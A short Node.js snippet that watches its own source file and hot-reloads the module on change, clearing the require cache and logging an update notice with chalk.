let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
